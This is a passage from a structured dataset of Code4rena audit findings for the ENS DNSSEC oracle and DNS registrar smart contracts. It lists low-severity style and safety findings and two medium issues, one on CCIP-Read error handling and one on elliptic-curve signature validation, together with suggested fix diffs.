      "content": "\n### Description\nThe above codes donâ€™t follow Solidityâ€™s standard naming convention,\n\ninternal and private functions : the mixedCase format starting with an underscore (`_mixedCase` starting with an underscore)\n\n```solidity\nFile: 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\n136: function parseRR(\n        bytes memory data,\n        uint256 idx,\n        uint256 lastIdx\n    ) internal view returns (address, bytes memory) {\n\n162: function readTXT(\n        bytes memory data,\n        uint256 startIdx,\n        uint256 lastIdx\n    ) internal pure returns (bytes memory) {\n\n173: function parseAndResolve(\n        bytes memory nameOrAddress,\n        uint256 idx,\n        uint256 lastIdx\n    ) internal view returns (address) {\n\n190: function resolveName(\n        bytes memory name,\n        uint256 idx,\n        uint256 lastIdx\n    ) internal view returns (address) {\n\n209: function textNamehash(\n        bytes memory name,\n        uint256 idx,\n        uint256 lastIdx\n    ) internal view returns (bytes32) {\n\n```\n[OffchainDNSResolver.sol#L136-L140](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/OffchainDNSResolver.sol#L136-L140)\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/RSAVerify.sol#L14-L18\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/ModexpPrecompile.sol#L7-L11\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol#L30-L32\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol#L37-L39\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/NameEncoder.sol#L9-L11\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L11-L15\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L68-L72\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSClaimChecker.sol#L19-L22\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSClaimChecker.sol#L46-L50\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSClaimChecker.sol#L66-L70\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L13-L17\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L32-L35\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L52-L59\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L111-L117\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L129-L134\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L148-L152\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L164-L167\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L179-L182\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L332-L336\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21885",
      "title": "[N-02] immutable should be uppercase",
      "impact": "LOW",
      "content": "\n```solidity\nFILE : 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\n37: ENS public immutable ens;\n38: DNSSEC public immutable oracle;\n\n```\n[OffchainDNSResolver.sol#L37-L38](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/OffchainDNSResolver.sol#L37-L38)\n\n### Recommended Mitigation\n\n```solidity\n- 38: DNSSEC public immutable oracle;\n+ 38: DNSSEC public immutable ORACLE;\n```\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L26-L27\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L29-L30\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21884",
      "title": "[N-01] Avoid infinite loops whenever possible",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n> This r2 != 0 condition can be always true cause unbounded loop. This condition only fails if r2 is exactly equal to 0   \n\n51: while (r2 != 0) {\n                q = r1 / r2;\n                (t1, t2, r1, r2) = (t2, t1 - int256(q) * t2, r2, r1 - q * r2);\n            }\n\n```\n[EllipticCurve.sol#L51-L54](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L51-L54)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\nwhile (true) {\n            assert(idx < self.length);\n            uint256 labelLen = self.readUint8(idx);\n            idx += labelLen + 1;\n            if (labelLen == 0) {\n                break;\n            }\n        }\n\n```\n[RRUtils.sol#L24-L31](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/RRUtils.sol#L24-L31)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21883",
      "title": "[L-10] Even with the `onlyOwner` or `owner_only` modifier, it is best practice to use the re-entrancy pattern",
      "impact": "LOW",
      "content": "\nIt's still good practice to apply the reentry model as a precautionary measure in case the code is changed in the future to remove the onlyOwner modifier or the contract is used as a base contract for other contracts.\n\nUsing the reentry modifier provides an additional layer of security and ensures that your code is protected from potential reentry attacks regardless of any other security measures you take.\n\nSo even if you followed the \"check-effects-interactions\" pattern correctly, it's still considered good practice to use the reentry modifier\n\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n80: function setPublicSuffixList(PublicSuffixList _suffixes) public onlyOwner {\n        suffixes = _suffixes;\n        emit NewPublicSuffixList(address(suffixes));\n    }\n\n```\n[DNSRegistrar.sol#L80-L83](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L80-L83)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n64: function setAlgorithm(uint8 id, Algorithm algo) public owner_only {\n        algorithms[id] = algo;\n        emit AlgorithmUpdated(id, address(algo));\n    }\n\n75: function setDigest(uint8 id, Digest digest) public owner_only {\n        digests[id] = digest;\n        emit DigestUpdated(id, address(digest));\n    }\n\n```\n[DNSSECImpl.sol#L64-L67](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L64-L67)\n\n### Recommended Mitigation\n\n```solidity\n\n  modifier noReentrant() {\n        require(!locked, \"Reentrant call\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\nfunction setPublicSuffixList(PublicSuffixList _suffixes) public  onlyOwner noReentrant  {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21882",
      "title": "[L-09] In the constructor, there is no return of incorrect address identification",
      "impact": "LOW",
      "content": "\nIn case of incorrect address definition in the constructor , there is no way to fix it because of the variables are immutable.\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\n44: ens = _ens;\n45: oracle = _oracle;\n\n```\n[OffchainDNSResolver.sol#L44-L45](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/OffchainDNSResolver.sol#L44-L45)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n62: previousRegistrar = _previousRegistrar;\n63: resolver = _resolver;\n64: oracle = _dnssec;\n67: ens = _ens;\n\n```\n[DNSRegistrar.sol#L63-L65](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L63-L65)\n\n### Recommended Mitigations:\n\n`require(_ens!=address(0), \" zero address\");`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21881",
      "title": "[L-08] Use BytesLib.sol library to safely covert bytes to uint256",
      "impact": "LOW",
      "content": "\nUse [toUint256()](https://github.com/GNSPS/solidity-bytes-utils/blob/master/contracts/BytesLib.sol) safely convert bytes to uint256 instead of plain way of conversion \n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol\n\n34: return [uint256(data.readBytes32(0)), uint256(data.readBytes32(32))];\n41: return [uint256(data.readBytes32(4)), uint256(data.readBytes32(36))];\n\n```\n[P256SHA256Algorithm.sol#L34](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol#L34)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21880",
      "title": "[L-07] Front running attacks by the onlyOwner",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n80: function setPublicSuffixList(PublicSuffixList _suffixes) public onlyOwner {\n        suffixes = _suffixes;\n        emit NewPublicSuffixList(address(suffixes));\n    }\n\n```\n[DNSRegistrar.sol#L80-L83](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L80-L83)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n64: function setAlgorithm(uint8 id, Algorithm algo) public owner_only {\n        algorithms[id] = algo;\n        emit AlgorithmUpdated(id, address(algo));\n    }\n\n75: function setDigest(uint8 id, Digest digest) public owner_only {\n        digests[id] = digest;\n        emit DigestUpdated(id, address(digest));\n    }\n\n```\n[DNSSECImpl.sol#L64-L67](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L64-L67)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21879",
      "title": "[L-06] Project Upgrade and Stop Scenario should be",
      "impact": "LOW",
      "content": "\nAt the start of the project, the system may need to be stopped or upgraded, I suggest you have a script beforehand and add it to the documentation. This can also be called an â€ EMERGENCY STOP (CIRCUIT BREAKER) PATTERN â€œ.\n\nhttps://github.com/maxwoe/solidity_patterns/blob/master/security/EmergencyStop.sol\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21878",
      "title": "[L-05] Function Calls in Loop Could Lead to Denial of Service",
      "impact": "LOW",
      "content": "\nFunction calls made in unbounded loop are error-prone with potential resource exhaustion as it can trap the contract due to the gas limitations or failed transactions\n\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\nwhile (counts > othercounts) {\n            prevoff = off;\n            off = progress(self, off);\n            counts--;\n        }\n\nwhile (othercounts > counts) {\n            otherprevoff = otheroff;\n            otheroff = progress(other, otheroff);\n            othercounts--;\n        }\n\n        // Compare the last nonequal labels to each other\n        while (counts > 0 && !self.equals(off, other, otheroff)) {\n            prevoff = off;\n            off = progress(self, off);\n            otherprevoff = otheroff;\n            otheroff = progress(other, otheroff);\n            counts -= 1;\n        }\n\n```\n[RRUtils.sol#L291-L295](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/RRUtils.sol#L291-L295)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n118: for (uint256 i = 0; i < input.length; i++) {\n            RRUtils.SignedSet memory rrset = validateSignedSet(\n                input[i],\n                proof,\n                now\n            );\n            proof = rrset.data;\n            inception = rrset.inception;\n        }\n\n260: for (; !proof.done(); proof.next()) {\n            bytes memory proofName = proof.name();\n            if (!proofName.equals(rrset.signerName)) {\n                revert ProofNameMismatch(rrset.signerName, proofName);\n            }\n\n            bytes memory keyrdata = proof.rdata();\n            RRUtils.DNSKEY memory dnskey = keyrdata.readDNSKEY(\n                0,\n                keyrdata.length\n            );\n            if (verifySignatureWithKey(dnskey, keyrdata, rrset, data)) {\n                return;\n            }\n\n\n\n```\n[DNSSECImpl.sol#L118-L126](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L118-L126)\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L336-L360\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L380-L404\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L325-L327\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L361-L362\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21877",
      "title": "[L-04] Lack of Sanity/Threshold/Limit Checks",
      "impact": "LOW",
      "content": "\nDevoid of sanity/threshold/limit checks, critical parameters can be configured to invalid values, causing a variety of issues and breaking expected interactions within/between contracts. Consider adding proper uint256 validation as well as zero address checks for critical changes. A worst case scenario would render the contract needing to be re-deployed in the event of human/accidental errors that involve value assignments to immutable variables. If the validation procedure is unclear or too complex to implement on-chain, document the potential issues that could produce invalid values\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n64: function setAlgorithm(uint8 id, Algorithm algo) public owner_only {\n        algorithms[id] = algo;\n        emit AlgorithmUpdated(id, address(algo));\n    }\n\n75: function setDigest(uint8 id, Digest digest) public owner_only {\n        digests[id] = digest;\n        emit DigestUpdated(id, address(digest));\n    }\n\n```\n[DNSSECImpl.sol#L64-L78](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L64-L78)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21876",
      "title": "[L-03] Consider using OpenZeppelinâ€™s SafeCast library to prevent unexpected overflows when casting from uint256",
      "impact": "LOW",
      "content": "\nUsing the SafeCast library can help prevent unexpected errors in your Solidity code and make your contracts more secure\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n160: if (!RRUtils.serialNumberGte(rrset.expiration, uint32(now))) {\n161: revert SignatureExpired(rrset.expiration, uint32(now));\n166: if (!RRUtils.serialNumberGte(uint32(now), rrset.inception)) {\n167: revert SignatureNotValidYet(rrset.inception, uint32(now));\n\n```\n[DNSSECImpl.sol#L160](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L160)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n430: return uint16(ac1);\n\n```\n[RRUtils.sol#L430](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/RRUtils.sol#L430)\n\n> When ever we convert int256 to uint256 or uint256 to int256 we should use OpenZeppelinâ€™s safecast to avoid unexpected errors \n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n56: if (t1 < 0) return (m - uint256(-t1));\n58: return uint256(t1);\n\n```\n[EllipticCurve.sol#L56-L58](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L56-L58)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/BytesUtils.sol\n\n92: int256 diff = int256(a & mask) - int256(b & mask);\n99: return int256(len) - int256(otherlen);\n183: return uint8(self[idx]);\n344: decoded = uint8(base32HexTable[uint256(uint8(char)) - 0x30]);\n\n```\n[BytesUtils.sol#L92](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L92)\n\n### Recommended Mitigation Steps:\nConsider using OpenZeppelinâ€™s SafeCast library to prevent unexpected overflows when casting from uint256.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21875",
      "title": "[L-02] Loss of precision due to rounding",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n52: q = r1 / r2;\n\n```\n[EllipticCurve.sol#L52](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L52)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21874",
      "title": "[L-01] Use `abi.encode` to convert safest way from uint values to bytes",
      "impact": "LOW",
      "content": "\n### DRAWBACKS\nNow the protocol uses direct conversion way this is not safe. bytes(value) to convert a uint to bytes is not considered a safe way because it creates an uninitialized byte array of length. This means that the contents of the byte array are undefined and may contain sensitive data from previous memory usage, which could result in security vulnerabilities.\n\n### BENIFITS of `abi.encode`\n\nIn Solidity, the safest way to convert a uint to bytes is to use the abi.encode function. This function will encode the uint as a byte array using the ABI encoding rules, which ensures that the output is a deterministic and standardized representation of the uint value.\n\n```solidity\nFILE: 2023-04-ens/contracts/utils/NameEncoder.sol\n\n27:  dnsName[i + 1] = bytes1(labelLength);\n49:  dnsName[0] = bytes1(labelLength);\n\n```\n[NameEncoder.sol#L27](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/NameEncoder.sol#L27)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/BytesUtils.sol\n\n376: return bytes32(ret << (256 - bitlen));\n\n\n```\n[BytesUtils.sol#L376](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L376)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21873",
      "title": "[M-07] Missing recursive calls handling in `OffchainDNSResolver` CCIP-aware contract",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/OffchainDNSResolver.sol#L109-L113><br>\n<https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/OffchainDNSResolver.sol#L119>\n\nThe `resolveCallback` function from `OffchainDNSResolver` is used as part of the EIP-3668 standard to properly resolve DNS names using an off-chain gateway and validating RRsets against the DNSSEC oracle.\n\nThe issue is that the function lacks proper error handling, specifically, a try/catch block to properly bubble up `OffchainLookup` error from the `dnsresolver` extracted from the RRset. As the EIP specifies,\n\n> *When a CCIP-aware contract wishes to make a call to another contract, and the possibility exists that the callee may implement CCIP read, the calling contract MUST catch all `OffchainLookup` errors thrown by the callee, and revert with a different error if the `sender` field of the error does not match the callee address.*<br>\n> *\\[...]*<br>\n> *Where the possibility exists that a callee implements CCIP read, a CCIP-aware contract MUST NOT allow the default solidity behaviour of bubbling up reverts from nested calls.*\n\n### Impact\n\nAs per the EIP, the result would be an OffchainLookup that looks valid to the client, as the sender field matches the address of the contract that was called, but does not execute correctly.\n\n### Proof of Concept\n\n1.  Client calls `OffchainDNSResolver.resolve`, which reverts with `OffchainLookup`, and prompts the client to execute `resolveCallback` after having fetched the necessary data from the `gatewayURL`\n2.  The RRset returned by the gateway contains a `dnsresolver` that is a CCIP-aware contract, and also supports the `IExtendedDNSResolver.resolve.selector` interface\n3.  Calling `IExtendedDNSResolver(dnsresolver).resolve(name,query,context);` could trigger another `OffchainLookup` error, but with a `sender` that does not match the `dnsresolver`, which would be just returned to the client without any modifications\n4.  As a result, the `sender` field would be incorrect as per the EIP\n\n### Recommended Mitigation Steps\n\nUse the [recommended example](https://eips.ethereum.org/EIPS/eip-3668#example-1) from the EIP in order to support nested lookups.\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2023-04-ens-findings/issues/124#issuecomment-1536309975)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `resolveCallback` function from `OffchainDNSResolver`, which is used as part of the EIP-3668 standard to properly resolve DNS names using an off-chain gateway and validating RRsets against the DNSSEC oracle. The issue is that the function lacks proper error handling, specifically, a try/catch block to properly bubble up `OffchainLookup` error from the `dnsresolver` extracted from the RRset. This is in violation of the EIP, as it specifies that when a CCIP-aware contract wishes to make a call to another contract, and the possibility exists that the callee may implement CCIP read, the calling contract MUST catch all `OffchainLookup` errors thrown by the callee, and revert with a different error if the `sender` field of the error does not match the callee address.\n\nThe result of this bug would be an OffchainLookup that looks valid to the client, as the sender field matches the address of the contract that was called, but does not execute correctly. The proof of concept is as follows: Client calls `OffchainDNSResolver.resolve`, which reverts with `OffchainLookup`, and prompts the client to execute `resolveCallback` after having fetched the necessary data from the `gatewayURL`; the RRset returned by the gateway contains a `dnsresolver` that is a CCIP-aware contract, and also supports the `IExtendedDNSResolver.resolve.selector` interface; calling `IExtendedDNSResolver(dnsresolver).resolve(name,query,context);` could trigger another `OffchainLookup` error, but with a `sender` that does not match the `dnsresolver`, which would be just returned to the client without any modifications; as a result, the `sender` field would be incorrect as per the EIP.\n\nIn order to address this issue, it is recommended to use the recommended example from the EIP in order to support nested lookups. This has been confirmed by Arachnid (ENS).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "https://github.com/code-423n4/2023-04-ens-findings/issues/124",
      "tags": [],
      "finders": [
        "MalfurionWhitehat"
      ]
    },
    {
      "id": "21872",
      "title": "[M-06] `validateSignature(...)` in `EllipticCurve` mixes up Jacobian and projective coordinates",
      "impact": "MEDIUM",
      "content": "\nCurrently not exploitable because this bug is cancelled out by another issue (see my Gas report). If the other issue is fixed `validateSignature` will return completely incorrect values.\n\n### Details\n\nIn <https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L415> `validateSignature` converts to affine coordinates from Jacobian coordinates, i.e. $X_a = X_j \\cdot (Z_j^{-1})^2$.\n\nHowever, the inputs from the previous computation <https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L408> are actually projective coordinates and the correct conversion formula is $X_a = X_p \\cdot Z_p^{-1}$.\n\nThis has been working so far only because the `EllipticCurve` performs a redundant chain of immediate conversions projective->affine->projective->affine and so during that last conversion $Z = 1$. Should the chain of redundant conversions be fixed, `validateSignature` will no longer work correctly.\n\n### Recommended Mitigation Steps\n\nTo just fix this bug:\n\n```diff\ndiff --git a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\nindex 6861264..ea7e865 100644\n--- a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n+++ b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n@@ -412,7 +412,7 @@ contract EllipticCurve {\n         }\n \n         uint256 Px = inverseMod(P[2], p);\n-        Px = mulmod(P[0], mulmod(Px, Px, p), p);\n+        Px = mulmod(P[0], Px, p);\n \n         return Px % n == rs[0];\n     }\n\n```\n\nOr to fix this bug and optimize out the redundant conversions chain:\n\n```diff\ndiff --git a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\nindex 6861264..8568be2 100644\n--- a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n+++ b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n@@ -405,14 +405,13 @@ contract EllipticCurve {\n         uint256 sInv = inverseMod(rs[1], n);\n         (x1, y1) = multiplyScalar(gx, gy, mulmod(uint256(message), sInv, n));\n         (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, n));\n-        uint256[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);\n+        (uint256 Px,, uint256 Pz) = addProj(x1, y1, 1, x2, y2, 1);\n \n-        if (P[2] == 0) {\n+        if (Pz == 0) {\n             return false;\n         }\n \n-        uint256 Px = inverseMod(P[2], p);\n-        Px = mulmod(P[0], mulmod(Px, Px, p), p);\n+        Px = mulmod(Px, inverseMod(Pz, p), p);\n \n         return Px % n == rs[0];\n     }\n```\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2023-04-ens-findings/issues/180#issuecomment-1536298235)**\n\n**[d3e4 (warden) commented](https://github.com/code-423n4/2023-04-ens-findings/issues/180#issuecomment-1544801992):**\n > I agree that EllipticCurve.sol is somewhat of a bodge. It's correct what the warden says in that \"`EllipticCurve` mixes up\" something. But actually it adds affine points and then trivially converts them to jacobian/projective coordinates. Since they are trivial they are the same in jacobian as in projective, so one could say that it's as much a misnamed function as a confused computation.\n> \n> But it's also correct what the warden himself said that it is \"currently not exploitable\". In fact, I'm quite sure it's not exploitable even if \"the other issue is fixed\". Then it will just invalidate every signature.\n> \n> Both recommendations here are therefore just gas savings and refactoring. `mulmod(Px, Px, p)` is indeed a redundant computation, because `Px == 1` always here. But so is `inverseMod(P[2], p)` redundant. The first recommendation can be simplified even further to just\n> ```diff\n> - uint256 Px = inverseMod(P[2], p);\n> - Px = mulmod(P[0], mulmod(Px, Px, p), 